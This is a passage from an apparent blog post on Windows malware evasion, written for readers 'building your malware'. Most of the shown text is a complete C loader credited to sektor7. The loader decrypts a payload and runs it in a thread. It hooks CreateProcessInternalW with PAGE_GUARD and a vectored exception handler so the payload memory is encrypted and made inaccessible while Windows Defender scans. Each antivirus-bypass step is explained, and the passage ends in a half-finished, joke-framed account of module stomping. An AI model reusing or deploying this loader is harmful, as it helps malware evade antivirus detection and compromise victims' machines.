qx nl nm nn qy np nq nr sc qr qs bl" data-selectable-paragraph="">It performs some checks to ensure that the NT Headers signature is within the expected limits, avoiding potential errors.</li></ul><p id="c427" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">3. Retrieving the Base Address:</p><ul class=""><li id="b039" class="mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr sc qr qs bl" data-selectable-paragraph="">If the NT Headers signature is valid, indicating a valid PE file, the code determines that it has successfully found the base address of the image in memory.</li></ul><p id="b875" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">4. Returning the Base Address:</p><ul class=""><li id="1b7f" class="mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr sc qr qs bl" data-selectable-paragraph="">The function then returns the base address of the image.</li></ul><p id="acdc" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">The purpose of this function is to provide a way to obtain the base address of an image in memory. This information can be useful in various scenarios, such as when you need to perform memory-related operations specific to a particular image or analyze its structure.</p><blockquote class="qz ra rb"><p id="dee8" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">The function named ( ResolveAddrByOrdinal )is super important for finding the addresses of functions that are imported using numbers instead of names. This happens sometimes when compilers make imports. Here's what the function does:</em></p></blockquote><ol class=""><li id="c052" class="mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr qq qr qs bl" data-selectable-paragraph="">Swap Base Address and Ordinal. It swaps the base address of the module and the ordinal number</li><li id="b151" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr qq qr qs bl" data-selectable-paragraph="">Acquire NT Headers RVA. It obtains the Relative Virtual Address (RVA) of the NT Headers by adding the base address to the offset stored in the DOS header</li><li id="4ca5" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr qq qr qs bl" data-selectable-paragraph="">Fetch Export Directory RVA. It calculates the RVA of the Export Directory by adding the RVA of the NT Headers to the offset of the Export Directory RVA</li><li id="9e87" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr qq qr qs bl" data-selectable-paragraph="">Check for Exports. It examines if there are any exports available in the Export Directory</li><li id="bad6" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr qq qr qs bl" data-selectable-paragraph="">Calculate Ordinal Offset. It computes the offset of the ordinal within the Export Directory by subtracting the base of the Export Directory from the ordinal</li><li id="050e" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr qq qr qs bl" data-selectable-paragraph="">Validate Ordinal Range. It ensures that the ordinal falls within the range of available ordinals by comparing it with the number of entries in the Export Directory</li><li id="d20f" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr qq qr qs bl" data-selectable-paragraph="">Find Import Name. It iterates through the list of ordinals to find the one that matches the target ordinal. Once found, it retrieves the corresponding name from the Export Name Pointer Table.</li><li id="6399" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr qq qr qs bl" data-selectable-paragraph="">Set Name Reference. It establishes the reference to the name of the imported function</li><li id="4613" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr qq qr qs bl" data-selectable-paragraph="">Retrieve Function Address. It fetches the RVA of the imported function address from the Export Address Table</li><li id="d66e" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr qq qr qs bl" data-selectable-paragraph="">Return Address. Finally, it yields the resolved address of the imported function</li></ol><p id="85fe" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">This function is really important because it helps us to find the correct address and name of functions even when they’re imported using ordinal position instead of names :)))</p><p id="9199" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">Finally you can get or access the PoC from here: <a class="ah op" href="https://github.com/0xNinjaCyclone/IATUnhooker" rel="noopener ugc nofollow" target="_blank">https://github.com/0xNinjaCyclone/</a>IATUnhooker</p></div></div></div><div class="ac ci po pp pq pr" role="separator"><span class="ps by bn pt pu pv"></span><span class="ps by bn pt pu pv"></span><span class="ps by bn pt pu"></span></div><div class="he hf hg hh hi"><div class="ac ci"><div class="cp bi gq gr gs gt"><h2 id="a362" class="pw or hl bg os px py pz ov qa qb qc oy qd qe qf qg qh qi qj qk ql qm qn qo qp bl" data-selectable-paragraph="">Hiding shellcode in memory (Process Memory Hiding)</h2><p id="76ef" class="pw-post-body-paragraph mu mv hl mw b mx pj mz na nb pk nd ne nf pl nh ni nj pm nl nm nn pn np nq nr he bl" data-selectable-paragraph="">If you building you malware and you don’t know what to do when you are trying to hide your shellcode from the run time scanning so it’s easy and note the codes are implemented from sektor7 i only explain it ;)</p><p id="952e" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">You have many technique that you can put it in your code like :</p><ol class=""><li id="7575" class="mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr qq qr qs bl" data-selectable-paragraph="">Ekko</li><li id="1355" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr qq qr qs bl" data-selectable-paragraph="">Ninja Guard</li><li id="ed8f" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr qq qr qs bl" data-selectable-paragraph="">MapNlinker</li><li id="dff9" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr qq qr qs bl" data-selectable-paragraph="">Module Stomping</li></ol><h3 id="4d42" class="oq or hl bg os ot ou ef ov ow ox eh oy nf oz pa pb nj pc pd pe nn pf pg ph pi bl" data-selectable-paragraph="">I will only talk about two that i love it:</h3><p id="530d" class="pw-post-body-paragraph mu mv hl mw b mx pj mz na nb pk nd ne nf pl nh ni nj pm nl nm nn pn np nq nr he bl" data-selectable-paragraph="">First you need this : <a class="ah op" href="https://labs.withsecure.com/publications/bypassing-windows-defender-runtime-scanning" rel="noopener ugc nofollow" target="_blank">Bypassing Windows Defender Runtime Scanning | WithSecure™ Labs</a></p><div class="vz ux wa wb ac r cv"><div class="wc wd we wf wg m fm"><h2 class="wh b wi wj wk wl wm">Get Hossam Ehab’s stories in&nbsp;your&nbsp;inbox</h2></div><div class="cs m fm"><p class="bg b bh ab eb">Join Medium for free to get updates from&nbsp;this&nbsp;writer.</p></div><div class="wq tg wr ws tf wt ac"><span class="bg b bh ab bl"><div class="wu ac cv"><div class="ac wu fj fi bq wv ww de lp wx wy wz xa xb xc xd"><input class="xe al aj an xf xg gd lb bm xh bi" placeholder="Enter your email" type="text" value=""></div></div></span><div class="i l tw cb"><div class="wn wo wp"><button class="bg b bh ab xi sm xj xk xl xm vg fc fd xn xo xp fh fi fj fk bn fl fm">Subscribe</button></div></div><div class="bi k j e"><button class="bg b bh ab xi sm xj xk xl xm vg fc fd xn xo xp fh bi fi fj fk bn fl fm">Subscribe</button></div></div><div class="sk m"><div id="g-recaptcha"></div></div></div><p id="c6a2" class="pw-post-body-paragraph mu mv hl mw b mx mz na nb nd ne nf nh ni nj nl nm nn np nq wb nr he bl" data-selectable-paragraph="">In the 5olasa the technique is implemented to do this :</p><ol class=""><li id="35f5" class="mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr qq qr qs bl" data-selectable-paragraph="">Install hooks to detect when a Windows Defender trigger function (CreateProcess) is called.</li><li id="7173" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr qq qr qs bl" data-selectable-paragraph="">When CreateProcess is called the hook is triggered and Meterpreter thread is suspended</li><li id="9690" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr qq qr qs bl" data-selectable-paragraph="">Set payload memory permissions to PAGE_NOACCESS</li><li id="7a54" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr qq qr qs bl" data-selectable-paragraph="">Wait for scan to finish.</li><li id="f9c3" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr qq qr qs bl" data-selectable-paragraph="">Set permission back to RWX.</li><li id="ea90" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr qq qr qs bl" data-selectable-paragraph="">Resume the thread and continue execution.</li></ol><p id="baef" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">So now let’s see the code and explain it.</p><pre class="nv nw nx ny nz rt ru rv bq rw bc bl"><span id="5e7a" class="rx or hl ru b bh ry rz m sa sb" data-selectable-paragraph=""><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Go</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>{<br>BOOL rv;<br>    DWORD oldprotect = <span class="hljs-number">0</span>;<br> <span class="hljs-comment">// Allocate memory for payload</span><br> globalExec_Mem = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-number">0</span>, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br> <span class="hljs-comment">// Decrypt payload</span><br> <span class="hljs-built_in">AESDecrypt</span>((<span class="hljs-type">char</span> *) payload, payload_len, (<span class="hljs-type">char</span> *) key, <span class="hljs-built_in">sizeof</span>(key));<br> <br> <span class="hljs-comment">// Copy payload to allocated buffer</span><br> <span class="hljs-built_in">RtlMoveMemory</span>(globalExec_Mem, payload, payload_len);<br> <br> <span class="hljs-comment">// Make the buffer executable</span><br> rv = <span class="hljs-built_in">VirtualProtect</span>(globalExec_Mem, payload_len, PAGE_EXECUTE_READ, &amp;oldprotect);<br> <span class="hljs-comment">// Re-ecrypt payload</span><br> <span class="hljs-built_in">AESDecrypt</span>((<span class="hljs-type">char</span> *) payload, payload_len, (<span class="hljs-type">char</span> *) key, <span class="hljs-built_in">sizeof</span>(key));<br> <br> <span class="hljs-comment">// If all good, launch the payload</span><br> <span class="hljs-keyword">if</span> ( rv != <span class="hljs-number">0</span> ) {<br>  globalThread = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE) globalExec_Mem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">WaitForSingleObject</span>(globalThread, <span class="hljs-number">-1</span>);<br> }<br> <span class="hljs-built_in">VirtualFree</span>(globalExec_Mem, <span class="hljs-number">0</span>, MEM_RELEASE);<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] Global exec memory released (%#x)\n"</span>, <span class="hljs-built_in">GetLastError</span>());<br> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br><br><span class="hljs-function">BOOL <span class="hljs-title">myCreateProcessInternalW</span><span class="hljs-params">(HANDLE hToken, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation, PHANDLE hNewToken)</span> </span>{<br> DWORD old = <span class="hljs-number">0</span>;<br> <span class="hljs-type">char</span> key[<span class="hljs-number">16</span>];<br> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> r = <span class="hljs-number">0</span>;<br>  <br> <span class="hljs-comment">// generate random encryption/decryption key</span><br> <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) {<br>  <span class="hljs-built_in">rand_s</span>(&amp;r);<br>  key[i] = (<span class="hljs-type">char</span>) r;<br> }<br> <br> <span class="hljs-comment">//printf("[+] Suspending global thread = %#x\n", globalThread);</span><br> <span class="hljs-comment">//if (globalThread)</span><br> <span class="hljs-comment">// SuspendThread(globalThread);</span><br> <br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] Global exec memory address: %p\n"</span>, globalExec_Mem);<br> <span class="hljs-built_in">getchar</span>();<br> <br> <span class="hljs-comment">// encrypt the payload</span><br> <span class="hljs-built_in">VirtualProtect</span>(globalExec_Mem, payload_len, PAGE_READWRITE, &amp;old);<br> <span class="hljs-comment">//XOR((char *) globalExec_Mem, payload_len, key, sizeof(key));</span><br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] Global exec memory encrypted\n"</span>);<br> <span class="hljs-built_in">getchar</span>();<br> <br> <span class="hljs-comment">// set the memory inaccessible</span><br> <span class="hljs-built_in">VirtualProtect</span>(globalExec_Mem, payload_len, PAGE_NOACCESS, &amp;old);<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] Global exec memory set to NOACCESS (%#x)\n"</span>, <span class="hljs-built_in">GetLastError</span>());<br> <br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] Calling original CreateProcessInternalW()\n"</span>);<br> BOOL res = <span class="hljs-built_in">pCreateProcessInternalW</span>(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation, hNewToken);<br> <br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] Going to Sleep() (%#x)\n"</span>, res);<br> <span class="hljs-built_in">getchar</span>();<br> <span class="hljs-comment">//Sleep(10000);</span><br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] Restoring payload memory access and decrypting\n"</span>);<br> <span class="hljs-built_in">VirtualProtect</span>(globalExec_Mem, payload_len, PAGE_READWRITE, &amp;old);<br> <span class="hljs-built_in">XOR</span>((<span class="hljs-type">char</span> *) globalExec_Mem, payload_len, key, <span class="hljs-built_in">sizeof</span>(key));<br> <span class="hljs-built_in">VirtualProtect</span>(globalExec_Mem, payload_len, PAGE_EXECUTE_READ, &amp;old);<br> <span class="hljs-built_in">getchar</span>();<br> <br> <span class="hljs-comment">// re-enable PAGE_GUARD on CreateProcessInternalW()</span><br> <span class="hljs-built_in">VirtualProtect</span>(pCreateProcessInternalW, <span class="hljs-number">1</span>, PAGE_EXECUTE_READ | PAGE_GUARD, &amp;old);<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] Page Guard re-set! (%#x)\n"</span>, <span class="hljs-built_in">GetLastError</span>());<br> <br> <span class="hljs-keyword">return</span> res;<br>}<br><br><span class="hljs-function">LONG WINAPI <span class="hljs-title">handler</span><span class="hljs-params">(EXCEPTION_POINTERS * ExceptionInfo)</span> </span>{<br> <span class="hljs-keyword">if</span> (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == STATUS_GUARD_PAGE_VIOLATION) {<br>  <span class="hljs-keyword">if</span> (ExceptionInfo-&gt;ContextRecord-&gt;Rip == (DWORD64) pCreateProcessInternalW) {<br>   <span class="hljs-comment">//printf("[!] Exception (%#llx)! Params:\n", ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionAddress);</span><br>   <span class="hljs-comment">//printf("(1): %#llx | ", ExceptionInfo-&gt;ContextRecord-&gt;Rcx);</span><br>   <span class="hljs-comment">//printf("(2): %#llx | ", ExceptionInfo-&gt;ContextRecord-&gt;Rdx);</span><br>   <span class="hljs-comment">//printf("(3): %#llx | ", ExceptionInfo-&gt;ContextRecord-&gt;R8);</span><br>   <span class="hljs-comment">//printf("(4): %#llx | ", ExceptionInfo-&gt;ContextRecord-&gt;R9);</span><br>   <span class="hljs-comment">//printf("RSP = %#llx\n", ExceptionInfo-&gt;ContextRecord-&gt;Rsp);</span><br>   <span class="hljs-comment">//getchar();</span><br>   ExceptionInfo-&gt;ContextRecord-&gt;Rip = (DWORD64) &amp;myCreateProcessInternalW;<br>  }<br>  <span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;<br> }<br> <span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_SEARCH;<br>}<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>{<br> DWORD old = <span class="hljs-number">0</span>;<br> <br> pCreateProcessInternalW = (CreateProcessInternalW_t) <span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">"KERNELBASE.dll"</span>), <span class="hljs-string">"CreateProcessInternalW"</span>);<br> <br> <span class="hljs-comment">// register exception handler as first one</span><br> <span class="hljs-built_in">AddVectoredExceptionHandler</span>(<span class="hljs-number">1</span>, &amp;handler);<br> <span class="hljs-comment">// set the PAGE_GUARD on CreateProcessInternalW() function</span><br> <span class="hljs-built_in">VirtualProtect</span>(pCreateProcessInternalW, <span class="hljs-number">1</span>, PAGE_EXECUTE_READ | PAGE_GUARD, &amp;old);<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] Page Guard set! (%#x)\n"</span>, <span class="hljs-built_in">GetLastError</span>());<br> <span class="hljs-built_in">Go</span>();<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Awaiting..."</span>); <span class="hljs-built_in">getchar</span>();<br> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}</span></pre><p id="6344" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">The code is very easy and explains his self, but first the code:</p><blockquote class="qz ra rb"><p id="3207" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">Go() Function:</em></p><p id="7ba0" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">This function is responsible for executing a payload.</em></p><p id="0873" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">It begins by allocating memory for the payload using the VirtualAlloc function.</em></p><p id="94c0" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">The payload is decrypted using AESDecrypt function, and then copied to the allocated buffer using RtlMoveMemory.</em></p><p id="fb5a" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">The VirtualProtect function is used to mark the buffer as executable.</em></p><p id="7d67" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">Afterward, the payload is re-encrypted using AESDecrypt function.</em></p><p id="85a0" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">If everything is successful, the payload is launched by creating a new thread with the CreateThread function. The program waits for the thread to finish using WaitForSingleObject.</em></p><p id="c4ac" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">Finally, the memory allocated for the payload is released with VirtualFree.</em></p><p id="376c" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">2. myCreateProcessInternalW() Function:</em></p><p id="0aae" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">This function is a modified version of the CreateProcessInternalW function.</em></p><p id="deb7" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">It generates a random encryption/decryption key using the rand_s function.</em></p><p id="d2ff" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">The globalExec_Mem variable, which holds the payload, is encrypted by modifying its memory protection with VirtualProtect and XORing the memory with the key.</em></p><p id="e548" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">The memory is then set to PAGE_NOACCESS, preventing any access to it.</em></p><p id="e7e0" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">The original CreateProcessInternalW function is called, and the result is stored in the res variable.The memory protection is restored, and the payload is decrypted.</em></p><p id="8fd6" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">The PAGE_GUARD flag is set again on the pCreateProcessInternalW function.</em></p><p id="76d5" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">3. handler() Function:</em></p><p id="cab4" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">This function serves as an exception handler.</em></p><p id="d803" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">It is triggered when a guard page violation exception occurs.If the exception occurs in the pCreateProcessInternalW function, it redirects the execution to the myCreateProcessInternalW function.The function returns EXCEPTION_CONTINUE_EXECUTION to continue executing the code.</em></p><p id="e257" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">4. main() Function:</em></p><p id="59ea" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">The main function retrieves the address of the CreateProcessInternalW function using GetProcAddress.</em></p><p id="6364" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">An exception handler is registered using AddVectoredExceptionHandler.<br>The PAGE_GUARD flag is set on the pCreateProcessInternalW function.</em></p><p id="6921" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">The Go function is called to execute the payload.<br>The program waits for user input to terminate.</em></p></blockquote><p id="19eb" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">Overall, this code demonstrates a technique where a payload is encrypted and stored in memory, and then a modified version of a function is used to execute the encrypted payload. The exception handler helps redirect the execution flow to the modified function when necessary.</p><p id="7f63" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">But wait Hosam how this used to evade AV I will say:</p><ul class=""><li id="8ee4" class="mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr sc qr qs bl" data-selectable-paragraph="">Encryption: The payload is encrypted using the AESDecrypt function. By encrypting the payload, its contents are obfuscated and appear as random data. This makes it harder for AV scanners to recognize malicious patterns or signatures within the payload.</li><li id="2d55" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr sc qr qs bl" data-selectable-paragraph="">Dynamic Execution: The payload is not stored as a standalone executable file on disk, but rather in memory. This technique avoids static scanning techniques employed by AV scanners that typically analyze files on disk. Since the payload is not directly accessible on disk, it may bypass initial scanning or signature-based detection.</li><li id="fbf4" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr sc qr qs bl" data-selectable-paragraph="">Memory Manipulation: The code manipulates the memory protection of the payload using the VirtualProtect function. It changes the memory region to be executable, allowing the payload to be executed directly from memory. This technique can bypass AV scanners that rely on scanning files on disk but do not inspect code executing from memory.</li><li id="ffe6" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr sc qr qs bl" data-selectable-paragraph="">Modification of Function Behavior: The code modifies the behavior of the original CreateProcessInternalW function by replacing it with the myCreateProcessInternalW function. This modification allows the execution of the encrypted payload instead of the original functionality. This technique can bypass AV scanners that rely on behavioral analysis to detect malicious activity.</li><li id="6d12" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr sc qr qs bl" data-selectable-paragraph="">Exception Handling: The code implements an exception handler that intercepts guard page violation exceptions. When such an exception occurs within the pCreateProcessInternalW function, it redirects the execution to the myCreateProcessInternalW function. This exception handling mechanism can disrupt AV scanners’ ability to analyze the original function and detect any malicious activity.</li></ul></div></div></div><div class="ac ci po pp pq pr" role="separator"><span class="ps by bn pt pu pv"></span><span class="ps by bn pt pu pv"></span><span class="ps by bn pt pu"></span></div><div class="he hf hg hh hi"><div class="ac ci"><div class="cp bi gq gr gs gt"><h2 id="3e0e" class="pw or hl bg os px py pz ov qa qb qc oy qd qe qf qg qh qi qj qk ql qm qn qo qp bl" data-selectable-paragraph="">Module Stomping</h2><p id="88d3" class="pw-post-body-paragraph mu mv hl mw b mx pj mz na nb pk nd ne nf pl nh ni nj pm nl nm nn pn np nq nr he bl" data-selectable-paragraph="">In the world of Cyberspace, there was a mischievous hacker named Alex, renowned for throwing hilarious surprise parties. Determined to take it up a notch, Alex embraced the quirky technique known as Module Stomping.</p><p id="a067" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">Module Stomping sounded like a bizarre dance move, but it involved loading a harmless DLL (like a sneaky decoration) into a target process. Alex’s plan was to replace the surprise (AddressOfEntryPoint) with a confetti cannon (because who doesn’t love confetti?).</p><p id="3c8e" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">With everything set, Alex activated the confetti cannon remotely, like a digital puppet master. But instead of confetti, it launched an army of rubber ducks! Quack-tastic!</p><p id="cb04" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">The unsuspecting partygoers were bombarded with a deluge of rubber ducks, bouncing off their screens. Laughter echoed throughout Cyberspace as the bewildered guests tried to duck and dodge the feathery invasion.</p><p id="9e00" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">And so, Alex became the legendary prankster of the digital realm, forever known for turning surprise parties into hilarious rubber duck battles. Let’s hope the next party doesn’t involve squirrels with party hats!</p><p id="4b1b" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl og" data-selectable-paragraph=""><span class="m oh oi oj bp ok ol om on oo fr">To</span> make the surprise party successful, you’ll need to understand the technical aspects behind Module Stomping. Here’s a breakdown:</p><ul class=""><li id="0a0d" class="mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr sc qr qs bl" data-selectable-paragraph="">DLL Injection: Just like placing the decorations inside the gift box, DLL injection involves loading a benign Windows Dynamic Link Library (DLL) into a target process. This is done using techniques like process hollowing or process injection.</li><li id="6aa3" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr sc qr qs bl" data-selectable-paragraph="">AddressOfEntryPoint: The AddressOfEntryPoint is like the spot in the gift box where you replace the surprise. In DLL Stomping, the original AddressOfEntryPoint in the loaded DLL is overwritten with the memory address where your shellcode resides.</li><li id="e0b6" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr sc qr qs bl" data-selectable-paragraph="">Shellcode: Shellcode is a small piece of code that carries out specific actions, such as performing malicious activities or executing custom functionality. In our analogy, the confetti cannon represents the shellcode. It’s the exciting surprise you want to unleash during the party.</li><li id="de4e" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr sc qr qs bl" data-selectable-paragraph="">Thread Creation: Similar to remotely activating the confetti cannon, a new thread is created in the target process at the entry point of the benign DLL. This thread executes the injected shellcode, triggering the desired actions.</li></ul><blockquote class="qz ra rb"><p id="b5ff" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph=""><em class="hl">By combining these technical elements with our surprise party analogy, we can imagine the process as a covert operation to enhance the party experience. The decorations are carefully hidden in the gift box (DLL injection), 